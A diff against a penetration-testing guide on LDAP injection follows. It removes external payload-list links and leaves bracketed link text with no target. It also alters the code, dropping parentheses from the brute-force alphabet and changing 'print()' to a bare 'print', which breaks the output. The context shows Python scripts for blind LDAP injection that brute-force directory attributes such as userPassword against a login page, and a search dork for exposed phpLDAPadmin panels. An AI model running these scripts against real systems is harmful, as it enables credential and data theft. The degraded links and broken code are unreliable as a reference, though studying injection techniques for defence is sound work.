@@ -110,8 +110,8 @@ password=any
 
 #### Lists
 
-- [LDAP_FUZZ](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_FUZZ.txt)
-- [LDAP Attributes](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_attributes.txt)
+- [LDAP_FUZZ]
+- [LDAP Attributes]
 - [LDAP PosixAccount attributes](https://tldp.org/HOWTO/archived/LDAP-Implementation-HOWTO/schemas.html)
 
 ### Blind LDAP Injection
@@ -149,7 +149,7 @@ You can iterate over the ascii letters, digits and symbols:
 
 #### **Discover valid LDAP fields**
 
-LDAP objects **contains by default several attributes** that could be used to **save information**. You can try to **brute-force all of them to extract that info.** You can find a list of [**default LDAP attributes here**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP_attributes.txt).
+LDAP objects **contains by default several attributes** that could be used to **save information**. You can try to **brute-force all of them to extract that info.** You can find a list of [**default LDAP attributes here**].
 
 ```python
 #!/usr/bin/python3
@@ -160,7 +160,7 @@ import sys
 
 proxy = { "http": "localhost:8080" }
 url = "http://10.10.10.10/login.php"
-alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
+alphabet = string.ascii_letters + string.digits + "_@{}-/!\"$%=^[]:;"
 
 attributes = ["c", "cn", "co", "commonName", "dc", "facsimileTelephoneNumber", "givenName", "gn", "homePhone", "id", "jpegPhoto", "l", "mail", "mobile", "name", "o", "objectClass", "ou", "owner", "pager", "password", "sn", "st", "surname", "uid", "username", "userPassword",]
 
@@ -180,7 +180,7 @@ for attribute in attributes: #Extract all attributes
 
             if char == alphabet[-1]: #If last of all the chars, then, no more chars in the value
                 finish = True
-                print()
+                print
 ```
 
 #### **Special Blind LDAP Injection (without "\*")**
@@ -189,7 +189,7 @@ for attribute in attributes: #Extract all attributes
 #!/usr/bin/python3
 
 import requests, string
-alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
+alphabet = string.ascii_letters + string.digits + "_@{}-/!\"$%=^[]:;"
 
 flag = ""
 for i in range(50):
@@ -210,5 +210,5 @@ intitle:"phpLDAPadmin" inurl:cmd.php
 
 ### More Payloads
 
-https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection
+
 
